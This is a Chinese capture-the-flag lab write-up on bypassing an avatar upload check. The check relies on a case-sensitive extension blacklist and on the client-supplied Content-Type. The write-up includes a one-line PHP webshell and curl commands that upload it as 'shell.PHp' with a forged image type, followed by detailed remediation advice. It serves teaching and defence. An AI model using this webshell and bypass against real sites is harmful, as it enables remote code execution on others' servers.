# 上传头像处的文件类型绕过

## 这一题在教什么

文件上传是所有 Web 漏洞里**最接近 getshell** 的那一类。你离 RCE 只差「那个文件
被服务端执行一下」。

这一题想让你记住两件事：

1. **黑名单永远列不全**，而且很容易写错（这题的错法是大小写敏感）。
2. **客户端说什么都可以是假的** —— 尤其是 `Content-Type` 这个头。

## 漏洞在哪

`module.py` 里的两道检查：

```python
blocked_by_ext  = any(filename.endswith(ext) for ext in BLOCKED_EXTENSIONS)
blocked_by_type = not (uploaded.mimetype or "").startswith("image/")
```

**第一道，大小写敏感**：`"shell.PHp".endswith(".php")` 是 `False`。
Windows 和 macOS 上文件系统大小写不敏感，Linux 上敏感 —— 这个差异让
「在我机器上是好的」变得毫无意义。

**第二道，信任客户端**：`uploaded.mimetype` 来自请求里的 `Content-Type` 头，
那是**发送方自己写的**。服务端把它当成事实来用，等于让攻击者自己盖章「我是图片」。

## 为什么浏览器做不了这题

这是个刻意的设计，也是个重要的认知：**浏览器只让你改文件名，不让你改
`Content-Type`**（它会根据后缀自己猜）。所以真实渗透里，文件上传绕过基本都得
靠 Burp Suite 或者 curl 手搓请求。

先随便创建一个文件：

```bash
printf '<?php system($_GET[0]); ?>' > shell.php
```

**第一步，只改大小写** —— 会撞上 Content-Type 那道检查：

```bash
curl -s -o /dev/null -w '%{http_code}\n' \
  -F 'avatar=@shell.php;filename=shell.PHp' \
  'http://<靶场地址>/v/upload/avatar/upload'
```

返回 400，页面会告诉你它拿到的 Content-Type 是什么 —— 记下来，下一步要用。

**第二步，把 Content-Type 也改成图片**：

```bash
curl -s -X POST \
  -F 'avatar=@shell.php;filename=shell.PHp;type=image/png' \
  'http://<靶场地址>/v/upload/avatar/upload'
```

两道都绕过去了，文件落进上传目录，页面会给你一个能直接打开的链接。

## 关于「为什么没有真的 getshell」

本靶场是**单进程 Python**，没有 PHP 解释器。你上传的 `.php` 文件躺在那儿，
没有任何东西会去执行它。

这一步我必须说清楚，不能糊弄：**真实站点上，从「文件落地」到「getshell」
还差一环 —— 那个文件得落在能被解释执行的目录里。** 这题把链条搭到了倒数第二环，
最后一环在 Python 里没法诚实地演示。

（也正因为单进程没有隔离，我不打算在靶场进程里真的执行用户上传的代码 ——
那会让一道题的通关变成整台靶场沦陷。）

## 怎么修

核心思路：**不要靠「检查名字」，要靠「从根上让它没用」。**

**1. 用白名单，不用黑名单**

```python
ALLOWED = {".png", ".jpg", ".jpeg", ".gif", ".webp"}
ext = os.path.splitext(filename)[1].lower()   # 注意 .lower()
if ext not in ALLOWED:
    abort(400)
```

**2. 别用用户给的文件名，自己重新生成**

```python
import uuid, os
safe_name = uuid.uuid4().hex + ext
```

这一步顺手解决了好几个别的问题：路径穿越、覆盖已有文件、
文件名里的特殊字符、编码绕过。

**3. 上传目录放在 Web 根目录外面**

用户上传的东西就不该能通过 URL 直接访问。需要展示图片就走一个
受控的接口（校验权限后再读文件返回）。

**4. 上传目录禁止执行**

- Nginx：`location ^~ /uploads/ { location ~ \.(php|py|pl|sh)$ { deny all; } }`
- Apache：`php_admin_flag engine off`，或者直接 `Options -ExecCGI`
- 更彻底：把上传目录挂到一个 `noexec` 的分区

**5. 别信 `Content-Type`，也别信图片本身**

```python
from PIL import Image
Image.open(stream).verify()      # 真的能被解析成图片才算数
```

「图片马」（在正常图片里夹一段 PHP 代码）就是专门绕「只检查文件头」的，
所以光看魔术字节不够。

## 顺手想想

- 黑名单里如果加了 `.php5`、`.phtml`、`.pht`、`.phar`，是不是就安全了？
  再想想 Apache 的 `AddHandler` / Nginx 的 `index.php` 配置。
- `shell.php.jpg` 这种双后缀，在不同服务器的配置下会发生什么？
- 如果上传目录确实不能执行，上传 `.html` 文件还有危害吗？（提示：存储型 XSS）
- 这题的黑名单里为什么把 `.py` 也列进去了？
  （提示：想想如果这个靶场的上传目录被当成 Python 包导入会怎样）
